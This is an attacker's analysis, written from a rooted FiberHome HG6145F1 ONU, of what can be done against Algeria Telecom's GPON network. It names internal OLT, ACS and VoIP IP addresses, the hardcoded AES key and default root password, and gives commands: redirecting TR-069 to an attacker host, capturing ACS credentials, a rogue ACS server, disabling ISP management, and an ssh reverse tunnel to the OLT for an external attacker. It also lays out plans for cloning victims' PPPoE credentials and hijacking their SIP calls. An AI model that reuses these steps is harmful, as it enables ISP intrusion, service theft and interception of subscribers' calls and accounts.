# ISP Network Deep Analysis — What We Can Actually Do

**From: Compromised FiberHome HG6145F1 ONU (root access)**
**ISP: Algeria Telecom | GPON Network**

---

## 1. ISP Management Infrastructure Access

### What We Have

From our compromised ONU, we sit on 3 ISP internal VLANs:

```
┌──────────────────────────────────────────────────────┐
│                    GPON FIBER                         │
│                                                      │
│  VLAN 12   ──── Internet (PPPoE to BRAS)             │
│  VLAN 114  ──── VoIP (SIP to 100.88.192.0/19)       │
│  VLAN 4087 ──── OLT Management (10.27.0.0/16)       │
│  VLAN 4089 ──── TR-069 ACS (10.26.0.0/16)           │
│                                                      │
│  Our ONU IPs:                                        │
│    10.27.76.15  (OLT mgmt)                           │
│    10.26.101.15 (TR-069)                             │
│    100.88.194.149 (VoIP)                             │
│    41.102.240.201 (Internet via PPPoE)               │
└──────────────────────────────────────────────────────┘
```

### OLT (10.27.100.18) — FiberHome GPON OLT

**What it controls:**
- ALL ONUs on this PON tree (typically 32-128 subscribers)
- Bandwidth allocation per subscriber (GEM port T-CONT)
- VLAN assignment per ONU
- OMCI provisioning (service profiles)
- ONU registration/deregistration

**What we confirmed:**
- Alive (responds to ping, TTL=64)
- MAC: 00:0a:88:88:88:07 (FiberHome vendor)
- Telnet port 23: FILTERED (timed out, not refused = ACL protected)
- All other ports: REFUSED (closed)
- No ONU-to-ONU bridging (proper isolation)

**Attack possibilities:**
1. **ACL bypass** — OLT telnet likely accepts from specific management IPs (NOC subnet). If we discover the correct source IP, we can spoof it on veip0.4087 and reach telnet. We tried common IPs (10.27.100.1, 10.27.0.1) without success. Would need to know the NOC subnet.

2. **OMCI exploitation** — We have /dev/bcm_omci (read-only char device). OMCI is the management protocol between OLT and ONU. The OLT sends OMCI commands to configure our ONU. We could potentially:
   - Craft malicious OMCI responses that exploit parsing bugs in the OLT
   - This requires deep knowledge of OMCI protocol and OLT firmware
   - Very advanced attack, no known public exploits for FiberHome OLTs

3. **PLOAM manipulation** — /dev/bcm_ploam and /dev/bcm_user_ploam are accessible. PLOAM (Physical Layer OAM) handles ONU registration, key exchange, and alarms. Potential attacks:
   - Send deregistration PLOAM to force our ONU offline (DoS to ourselves)
   - Manipulate key exchange (GPON encryption is weak, often disabled)
   - Again requires deep protocol knowledge

4. **Wait for OLT vulnerability** — FiberHome OLTs have had CVEs before. Our VLAN access means if a new OLT vulnerability is published, we already have network access to exploit it.

**Realistic assessment: LOW probability of OLT compromise from ONU level without OLT-specific 0day.**

### ACS Server (10.26.100.7) — TR-069 Auto-Configuration Server

**What it controls:**
- Remote configuration of ALL subscriber routers
- Firmware push to ALL routers
- Credential provisioning
- Service activation/deactivation
- Monitoring and diagnostics

**What we confirmed:**
- Alive (responds to ping)
- All TCP ports refused (no web, no SSH, no telnet)
- Likely accepts connections only FROM routers (not TO it)
- TR-069 uses HTTP/HTTPS — ACS initiates ConnectionRequest to ONU, ONU connects back to ACS URL

**Attack possibilities:**
1. **ARP spoofing on VLAN 4089** — We share the TR-069 VLAN with the ACS. If other ONUs also have TR-069 on this VLAN, we could ARP spoof between them and the ACS. BUT: OLT isolates ONUs, so we can only see traffic between OUR ONU and the ACS. No other ONU's TR-069 traffic is visible to us.

2. **TR-069 MITM via DNS** — If the TR-069 client resolves the ACS URL via DNS, and we control DNS on the TR-069 VLAN, we could redirect the URL to our server. BUT: the ACS URL is typically an IP address, not a hostname.

3. **Rogue ACS** — We can redirect our own TR-069 client to a custom ACS server:
   ```
   ubus call tr069 config_change '{"url":"http://ATTACKER_IP:7547/acs","data":{}}'
   ```
   This only affects OUR ONU — but it means the ISP loses control of our device.

4. **TR-069 credential theft** — When our ONU connects to the real ACS, the HTTP headers contain authentication credentials. If we capture this traffic (tcpdump on veip0.4089), we get the ACS authentication credentials. These might work for other subscribers' ACS connections too (if shared credentials).

**Realistic assessment: Can steal our own TR-069 credentials. Cannot MITM other subscribers due to OLT isolation. Can disconnect our ONU from ISP management.**

### VoIP Gateway (100.88.192.1) — SIP Infrastructure

**What it controls:**
- VoIP call routing for all subscribers
- SIP registration
- RTP media relay
- Call records (CDR)

**What we confirmed:**
- Alive (responds to ping, TTL=255 = core router/gateway)
- Our SIP client on UDP 5060 at 100.88.194.149
- SIP proxy: p-cscf.ims.algerietelecom.dz
- No active SIP traffic captured during testing

**Attack possibilities:**
1. **SIP registration hijack** — If we know another subscriber's SIP credentials (obtainable by compromising their router via CVE-1→CVE-3 chain), we can register as their SIP endpoint. Incoming calls to their number would ring on our device instead. This is a real attack but requires the victim's SIP credentials.

2. **SIP INVITE spoofing** — Send crafted SIP INVITE messages to make calls that appear to come from another subscriber. Depends on whether the SIP proxy validates the From header against the registration.

3. **RTP interception** — If SIP negotiation routes RTP media through our network segment (unlikely due to OLT isolation), we could capture voice data. More realistic: if we compromise a router AND that router's VoIP is active, we can capture the local RTP stream.

4. **VoIP DoS** — Flood the SIP proxy with REGISTER/INVITE requests to disrupt VoIP service. Affects our ONU's VoIP but due to isolation, shouldn't affect others.

**Realistic assessment: Can attack our own VoIP subscription. Cannot intercept other subscribers' calls due to OLT isolation. Could potentially hijack calls IF we steal victim's SIP credentials through other means.**

---

## 2. ISP Credential Cloning — Detailed Analysis

### What We Can Steal

From a single compromised HG6145F1:

| Credential | How to Extract | Decryption |
|-----------|---------------|------------|
| PPPoE Username | `/fhconf/usrconfig_conf` → AES encrypted | Key: `ABCDEFGHIJKLMNOP` |
| PPPoE Password | `/fhconf/usrconfig_conf` → AES encrypted | Key: `ABCDEFGHIJKLMNOP` |
| VoIP SIP User | `/fhconf/usrconfig_conf` → AES encrypted | Key: `ABCDEFGHIJKLMNOP` |
| VoIP SIP Pass | `/fhconf/usrconfig_conf` → AES encrypted | Key: `ABCDEFGHIJKLMNOP` |
| WiFi PSK | `/fhconf/usrconfig_conf` → AES encrypted | Key: `ABCDEFGHIJKLMNOP` |
| GPON Serial Number | `get_base_info` API or router sticker | Plaintext: `FHTTC0B3B90D` |
| GPON LOID | `/fhconf/usrconfig_conf` | Plaintext: `fiberhome` |
| Root password | `/etc/passwd` | MD5-crypt: `root123` (default) |
| Config backup | Export via web UI | XOR with `i+9527` |

### PPPoE Cloning Scenarios

**Scenario A: Use stolen PPPoE on OUR fiber (same OLT)**

```
Attacker ONU ──── GPON ──── OLT ──── BRAS/BNG ──── Internet
                              │
                              └── RADIUS checks:
                                  1. GPON SN match?
                                  2. PPPoE username/password valid?
                                  3. Duplicate session check?
```

Steps:
1. Get victim's PPPoE creds (compromise their router or intercept config backup)
2. Get victim's GPON SN (from `get_base_info` or sticker)
3. On OUR router: change GPON SN to victim's SN
   - Requires writing to GPON SFP module EEPROM
   - Device: `/dev/bcm_ploam` or i2c interface
   - With root access, POSSIBLE but complex
4. Disconnect victim's ONU (or wait for them to go offline)
5. Our ONU registers with victim's SN → OLT accepts
6. Start PPPoE with victim's credentials → BRAS accepts
7. We now have internet on victim's account (they pay)

**Difficulty:** HIGH — requires GPON SN spoofing at hardware level and victim offline
**Detectable:** YES — duplicate SN registration triggers OLT alarm

**Scenario B: Use stolen PPPoE from DIFFERENT location**

If ISP RADIUS only checks PPPoE username/password (no GPON SN binding):
1. Get any HG6145F1 at a different Algeria Telecom location
2. Compromise it (CVE-1 → admin → CVE-4 → root)
3. Change PPPoE credentials to victim's
4. If RADIUS accepts → free internet on victim's bill

If ISP RADIUS checks PPPoE + GPON SN:
- Need to also spoof GPON SN on the second ONU
- Same difficulty as Scenario A

**Difficulty:** MEDIUM — depends on ISP RADIUS binding model
**Detectable:** YES — login from wrong OLT/port is anomalous

**Scenario C: Create extra PPPoE session on same line**

We tested this: starting second `pppd` with same credentials on our ONU.
Result: Did NOT get ppp1 interface — RADIUS likely rejects duplicate sessions.

**Conclusion:** ISP has duplicate session detection. Cannot use same creds simultaneously.

### What This Means Practically

The REALISTIC credential theft scenarios are:
1. **Get free internet temporarily** by using victim's creds while they're offline (e.g., at night)
2. **Identity theft** — actions on the internet appear as the victim's IP
3. **Social engineering** — knowing someone's PPPoE ID reveals their Algeria Telecom account number

---

## 3. TR-069 Redirection — Becoming Our Own ACS

### How TR-069 Works

```
Normal flow:
  ACS Server ───────── ConnectionRequest ──────► ONU (port 7547)
  ACS Server ◄─────── HTTP Inform ─────────────  ONU
  ACS Server ───────── SetParameterValues ──────► ONU (push config)
  ACS Server ───────── Download ────────────────► ONU (push firmware)
```

### What We Can Do

**A. Redirect TR-069 to our own ACS:**

```bash
# Via ubus (from root shell):
ubus call tr069 config_change '{"url":"http://OUR_SERVER:7547/acs","data":{}}'

# Or modify the config directly:
# Set ManagementServer.URL to our server
```

**Impact:**
- ISP LOSES ability to manage our router
- ISP cannot push firmware updates to us
- ISP cannot read our config remotely
- ISP cannot factory reset our router remotely
- We control what config our router accepts
- We can prevent ISP from disabling our service

**B. Capture TR-069 authentication:**

```bash
# When our ONU connects to real ACS, capture the HTTP headers:
tcpdump -i veip0.4089 -A -s 0 port 80 or port 443 or port 7547
```

This captures:
- ACS URL (where ISP manages routers)
- HTTP Basic/Digest auth credentials
- ConnectionRequest username/password
- Any config data pushed by ACS

**C. Impersonate ACS for our own router:**

Set up a rogue ACS server on our network:

```python
# Simplified rogue ACS (Python)
from http.server import HTTPServer, BaseHTTPRequestHandler

class ACSHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Receive Inform from ONU
        data = self.rfile.read(int(self.headers['Content-Length']))
        print(f"ONU Inform: {data[:200]}")

        # Respond with SetParameterValues to change config
        response = """<?xml version="1.0"?>
        <soap:Envelope>
          <soap:Body>
            <cwmp:SetParameterValues>
              <!-- Change any router setting -->
            </cwmp:SetParameterValues>
          </soap:Body>
        </soap:Envelope>"""

        self.send_response(200)
        self.end_headers()
        self.wfile.write(response.encode())

HTTPServer(('0.0.0.0', 7547), ACSHandler).serve_forever()
```

**D. Disable TR-069 permanently:**

```bash
# Kill TR-069 process
kill $(pidof tr069)

# Prevent restart
# Method 1: Block at firewall
iptables -A OUTPUT -p tcp --dport 7547 -j DROP
iptables -A OUTPUT -p tcp -d 10.26.100.7 -j DROP

# Method 2: Remove from service list (needs persistent storage mod)
# Method 3: Redirect to localhost
echo "10.26.100.7 127.0.0.1" >> /etc/hosts
```

**Impact of disabling TR-069:**
- ISP cannot remotely manage the router
- ISP cannot push firmware updates (good: prevents patching our root access)
- ISP cannot factory reset remotely
- ISP cannot read WiFi passwords, connected devices, etc.
- ISP loses monitoring/diagnostic capability
- **ISP may detect the outage** and investigate (or not — many ISPs don't actively monitor TR-069 status)

---

## 4. Pivot Point — If OLT is Compromised Separately

### Why This Matters

If someone ELSE compromises the OLT (via physical access to the ISP CO, social engineering, supply chain attack, or OLT 0day), our VLAN access becomes a pivot:

```
Attacker ──► Internet ──► Our compromised ONU
                              │
                              ├── VLAN 4087 ──► OLT (already compromised)
                              │                  │
                              │                  ├── Control ALL ONUs
                              │                  ├── Change bandwidth per subscriber
                              │                  ├── Deregister any subscriber
                              │                  └── Intercept any subscriber traffic
                              │
                              ├── VLAN 4089 ──► ACS
                              │                  │
                              │                  ├── Push malicious firmware to ALL routers
                              │                  ├── Read ALL subscriber configs
                              │                  ├── Factory reset ANY router
                              │                  └── Change ANY subscriber settings
                              │
                              └── VLAN 114 ──►  VoIP
                                               │
                                               ├── Intercept ANY call
                                               ├── Make calls as ANY subscriber
                                               └── Access call records
```

### What OLT Compromise Enables

If the OLT at 10.27.100.18 is compromised (FiberHome OLT default creds, firmware vuln, etc.):

**Per-subscriber control:**
- Change bandwidth allocation (T-CONT/GEM port profiles)
- Assign/remove VLANs per ONU
- Enable/disable ONU ports
- Push OMCI configuration to any ONU
- Read/write ONU configuration remotely
- Factory reset any ONU
- Deregister any ONU (cut their service)

**Network-wide:**
- Disable ONU isolation → enable ONU-to-ONU traffic
- Create new VLANs bridged to all ONUs
- Mirror traffic from any ONU to our ONU
- Intercept all GPON upstream traffic (before encryption)
- Modify GPON encryption keys

**Scale of impact:**
- Single PON port: 32-128 subscribers
- Single OLT chassis: 1,000-10,000+ subscribers
- If OLT management network is flat: ALL OLTs in the region

### How Our Access Helps

Without our compromised ONU:
- Attacker needs VPN/physical access to ISP management network
- Attacker needs to know OLT IP addresses
- Multiple security layers to bypass

With our compromised ONU:
- Direct L3 access to OLT from the internet (via reverse tunnel from ONU)
- Known OLT IP: 10.27.100.18
- Known ACS IP: 10.26.100.7
- Known VoIP GW: 100.88.192.1
- Persistent access even after ISP patches external firewall

**Setup reverse tunnel:**
```bash
# From our compromised ONU:
ssh -R 4087:10.27.100.18:23 attacker@external-server
# Now attacker can telnet to OLT through our ONU
```

---

## Summary: Realistic Threat Model

| Attack | Feasibility | Impact | Requires |
|--------|------------|--------|----------|
| Steal own ISP credentials | EASY | Medium | Root on own router |
| Disable TR-069 management | EASY | Medium | Root on own router |
| Redirect TR-069 to rogue ACS | EASY | Medium | Root + server |
| DNS hijack own LAN | EASY | High | Root on own router |
| Capture own LAN traffic | EASY | High | Root on own router |
| Clone PPPoE (same location) | HARD | High | Root + GPON SN spoof + victim offline |
| Clone PPPoE (diff location) | MEDIUM | High | Root on 2nd router + maybe SN spoof |
| Hijack VoIP calls | MEDIUM | High | Victim's SIP creds |
| Compromise OLT | VERY HARD | Critical | OLT 0day or ACL bypass |
| Compromise ACS | VERY HARD | Critical | ACS vulnerability |
| Control other subscribers | IMPOSSIBLE directly | Critical | Requires OLT or ACS compromise |
| Pivot for external attacker | EASY (setup) | Critical | External attacker + our root access |
